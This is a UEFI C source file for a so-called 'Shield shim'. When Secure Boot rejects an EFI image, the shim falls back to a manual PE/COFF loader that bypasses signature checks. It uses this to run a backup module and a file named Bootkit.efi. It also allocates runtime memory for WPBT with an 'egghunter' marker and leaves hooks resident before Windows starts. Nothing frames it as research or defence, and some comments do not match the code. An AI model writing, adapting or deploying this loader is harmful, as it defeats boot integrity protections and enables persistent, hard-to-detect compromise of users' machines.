/*
Looks for  \EFI\Boot\Shield.efi.bak  on the same partition.
Tries firmware LoadImage(); if SB blocks, falls back to a manual PE/COFF loader that bypasses signature checks.
Runs the vendor module, leaves its Block-IO hooks resident, prints progress, and returns EFI_SUCCESS.
*/

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/PeCoffLib.h>
#include <Library/CacheMaintenanceLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/SimpleFileSystem.h>
#include <Guid/FileInfo.h>

//open file on same volume
STATIC EFI_STATUS
OpenFileAbsPath (
  IN  EFI_DEVICE_PATH_PROTOCOL   *AbsPath,
  OUT EFI_FILE_PROTOCOL         **File
  )
{
  EFI_STATUS                       Status;
  EFI_HANDLE                       FsHandle;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *Fs;
  EFI_DEVICE_PATH_PROTOCOL        *Remain = AbsPath;

  Status = gBS->LocateDevicePath (&gEfiSimpleFileSystemProtocolGuid,
                                  &Remain, &FsHandle);
  if (EFI_ERROR (Status)) return Status;

  Status = gBS->OpenProtocol (FsHandle,
                              &gEfiSimpleFileSystemProtocolGuid,
                              (VOID **)&Fs,
                              NULL, NULL,
                              EFI_OPEN_PROTOCOL_GET_PROTOCOL);
  if (EFI_ERROR (Status)) return Status;

  EFI_FILE_PROTOCOL *Root;
  Status = Fs->OpenVolume (Fs, &Root);
  if (EFI_ERROR (Status)) return Status;

  return Root->Open (
           Root,
           File,
           ((FILEPATH_DEVICE_PATH *)Remain)->PathName,
           EFI_FILE_MODE_READ,
           0);
}

//read entire file
STATIC EFI_STATUS
ReadFileWhole (
  IN  EFI_FILE_PROTOCOL  *File,
  OUT VOID              **Buffer,
  OUT UINTN             *Size
  )
{
  EFI_STATUS     Status;
  EFI_FILE_INFO *Info;
  UINTN          InfoSz = 0;
  EFI_GUID       InfoId = EFI_FILE_INFO_ID;

  Status = File->GetInfo (File, &InfoId, &InfoSz, NULL);
  if (Status != EFI_BUFFER_TOO_SMALL) return Status;

  Info = AllocatePool (InfoSz);
  if (!Info) return EFI_OUT_OF_RESOURCES;

  Status = File->GetInfo (File, &InfoId, &InfoSz, Info);
  if (EFI_ERROR (Status)) { FreePool (Info); return Status; }

  *Size   = (UINTN)Info->FileSize;
  *Buffer = AllocatePool (*Size);
  FreePool (Info);
  if (!*Buffer) return EFI_OUT_OF_RESOURCES;

  return File->Read (File, Size, *Buffer);
}

//PE/COFF ImageRead callback
STATIC
EFI_STATUS
EFIAPI
ImageReadFromBuffer (
  IN  VOID   *FileHandle,          //pointer to whole file
  IN  UINTN   FileOffset,
  IN OUT UINTN *ReadSize,
  OUT VOID   *Buffer               //destination buffer
  )
{
  CopyMem (Buffer, (UINT8 *)FileHandle + FileOffset, *ReadSize);
  return EFI_SUCCESS;
}

/* ------------------------------------------------------------------ 
ManualLoad
Reads \EFI\Boot\Shield.efi.bak into RAM
Uses PE/COFF helpers to COPY sections + RELOCATE
Returns the image’s entry point through *Entry
------------------------------------------------------------------ */
STATIC
EFI_STATUS
ManualLoad (
  IN  EFI_DEVICE_PATH_PROTOCOL *AbsPath,
  OUT EFI_IMAGE_ENTRY_POINT    *Entry
  )
{
  EFI_STATUS                    Status;
  EFI_FILE_PROTOCOL            *File;
  VOID                         *FileBuf = NULL;
  UINTN                         FileSz  = 0;
  PE_COFF_LOADER_IMAGE_CONTEXT  Ctx;

  //open and read the whole file
  Status = OpenFileAbsPath (AbsPath, &File);
  if (EFI_ERROR (Status)) return Status;

  Status = ReadFileWhole (File, &FileBuf, &FileSz);
  File->Close (File);
  Print (L"[shim]  manual read      -> %r (size=%u)\n", Status, (UINT32)FileSz);
  if (EFI_ERROR (Status)) return Status;

  //analyse PE headers 
  ZeroMem (&Ctx, sizeof (Ctx));
  Ctx.Handle    = FileBuf;      
  Ctx.ImageRead = ImageReadFromBuffer;

  Status = PeCoffLoaderGetImageInfo (&Ctx);
  if (EFI_ERROR (Status)) return Status;

  //allocate destination pages
  EFI_PHYSICAL_ADDRESS Dest = 0;
  Status = gBS->AllocatePages (AllocateAnyPages,
                               EfiLoaderData,
                               EFI_SIZE_TO_PAGES (Ctx.ImageSize),
                               &Dest);
  if (EFI_ERROR (Status)) return Status;

  Ctx.ImageAddress = Dest;

  //copy sections into Dest
  Status = PeCoffLoaderLoadImage (&Ctx);
  Print (L"[shim]  manual loadimage -> %r\n", Status);
  if (EFI_ERROR (Status)) return Status;

  //apply relocations
  Status = PeCoffLoaderRelocateImage (&Ctx);
  Print (L"[shim]  manual relocate  -> %r\n", Status);
  if (EFI_ERROR (Status)) return Status;

  //flush cache and return entry
  InvalidateInstructionCacheRange ((VOID *)(UINTN)Dest, Ctx.ImageSize);
  *Entry = (EFI_IMAGE_ENTRY_POINT)(UINTN)Ctx.EntryPoint;
  return EFI_SUCCESS;
}

VOID
RemoveArgumentFromLoadOptions(
    IN OUT EFI_LOADED_IMAGE_PROTOCOL *LoadedImage,
    IN     CHAR16                    *Argument
)
{
    if (LoadedImage == NULL || LoadedImage->LoadOptions == NULL || LoadedImage->LoadOptionsSize == 0)
        return;

    CHAR16 *Options = (CHAR16 *)LoadedImage->LoadOptions;
    UINTN   Size    = LoadedImage->LoadOptionsSize;
    UINTN   Len     = Size / sizeof(CHAR16);
    UINTN   ArgLen  = StrLen(Argument);

    for (UINTN i = 0; i <= Len - ArgLen; i++) {
        if (StrnCmp(&Options[i], Argument, ArgLen) == 0) {
            UINTN Start = i;
            if (Start > 0 && Options[Start - 1] == L' ')
                Start--;

            UINTN End = i + ArgLen;
            while (End < Len && Options[End] == L' ')
                End++;

            UINTN Shift = End - Start;

            //shift remaining characters
            for (UINTN j = Start; j + Shift < Len; j++)
                Options[j] = Options[j + Shift];

            //zero remaining buffer
            for (UINTN j = Len - Shift; j < Len; j++)
                Options[j] = L'\0';

            Print(L"[shim] Removed '%s' from LoadOptions\n", Argument);
            return;
        }
    }
}

//main entry
EFI_STATUS EFIAPI
UefiMain (EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
  EFI_STATUS                  Status;
  EFI_LOADED_IMAGE_PROTOCOL  *Self;
  EFI_DEVICE_PATH_PROTOCOL   *BakPath;
  EFI_HANDLE                  BakHandle = NULL;
  EFI_IMAGE_ENTRY_POINT       Entry     = NULL;

  Print (L"[shim] === Shield shim starting ===\n");

  Status = gBS->OpenProtocol (ImageHandle,
                              &gEfiLoadedImageProtocolGuid,
                              (VOID **)&Self,
                              ImageHandle, NULL,
                              EFI_OPEN_PROTOCOL_GET_PROTOCOL);
  Print (L"[shim] OpenProtocol(self) -> %r\n", Status);
  if (EFI_ERROR (Status)) return Status;

  BakPath = FileDevicePath (Self->DeviceHandle,
                            L"\\EFI\\Boot\\Shield.efi.bak");
  Print (L"[shim] Using absolute backup path\n");
  gBS->Stall(2 * 1000000);  // 5 seconds
//allocate efi runtime data for wpbt
	EFI_PHYSICAL_ADDRESS MyRtData = 0;
	EFI_STATUS AllocStatus = gBS->AllocatePages(
	    AllocateAnyPages,
	    EfiRuntimeServicesData,
	    EFI_SIZE_TO_PAGES(0x100000),  // 1 MB
	    &MyRtData
	);

	if (EFI_ERROR(AllocStatus)) {
	    Print(L"[shim] Failed to allocate RT_DATA -> %r\n", AllocStatus);
	} else {
	    Print(L"[shim] Allocated RT_DATA at %lx\n", MyRtData);

	    SetMem((VOID*)(UINTN)MyRtData, 16, 0xCC);  //fill first 16 bytes (if you want "egghunter")
	}
  gBS->Stall(2 * 1000000);  // 5 seconds

  Status = gBS->LoadImage (FALSE, ImageHandle, BakPath,
                           NULL, 0, &BakHandle);
  Print (L"[shim] LoadImage() -> %r\n", Status);

  if (Status == EFI_SECURITY_VIOLATION) {
    Print (L"[shim] SB blocked image – manual loader\n");
    Status = ManualLoad (BakPath, &Entry);
    if (EFI_ERROR (Status) || Entry == NULL) {
      Print (L"[shim] Manual loader failed -> %r\n", Status);
      return Status;
    }
    Print (L"[shim] Calling vendor entry (manual)\n");
    Status = Entry (ImageHandle, SystemTable);
    Print (L"[shim] Vendor entry returned -> %r\n", Status);

  } else if (!EFI_ERROR (Status)) {
    Print (L"[shim] StartImage() ...\n");
    Status = gBS->StartImage (BakHandle, NULL, NULL);
    Print (L"[shim] StartImage returned -> %r\n", Status);

  } else {
    Print (L"[shim] Backup image not found -> %r\n", Status);
    return Status;
  }
  gBS->Stall(2 * 1000000); 

  //load & start an extra image

  {
    RemoveArgumentFromLoadOptions(Self, L"--shdmgr");

    EFI_DEVICE_PATH_PROTOCOL *ExtraPath;
    EFI_HANDLE                ExtraHandle = NULL;
    EFI_IMAGE_ENTRY_POINT     ExtraEntry  = NULL;

    ExtraPath = FileDevicePath (Self->DeviceHandle,
                                L"\\EFI\\Boot\\Bootkit.efi");
    Print (L"[shim] Loading Extra.efi ...\n");

    Status = gBS->LoadImage (FALSE, ImageHandle, ExtraPath,
                             NULL, 0, &ExtraHandle);
    Print (L"[shim]   LoadImage(extra) -> %r\n", Status);

    if (Status == EFI_SECURITY_VIOLATION) {
      //fall back to manual loader again if SB blocks it
      Status = ManualLoad (ExtraPath, &ExtraEntry);
      if (!EFI_ERROR (Status) && ExtraEntry) {
        Print (L"[shim]   Calling Extra.efi (manual)\n");
        Status = ExtraEntry (ImageHandle, SystemTable);
        Print (L"[shim]   Extra.efi returned -> %r\n", Status);
      } else {
        Print (L"[shim]   Manual load of Extra.efi failed -> %r\n", Status);
      }
    } else if (!EFI_ERROR (Status)) {
      Status = gBS->StartImage (ExtraHandle, NULL, NULL);
      Print (L"[shim]   StartImage(extra) -> %r\n", Status);
    }
  }

  /* ------------------------------------------------------------------ */
  Print (L"[shim] Hooks active, Windows may boot now\n");
  gBS->Stall(3 * 1000000);  // 5 seconds
  return EFI_SUCCESS;
}

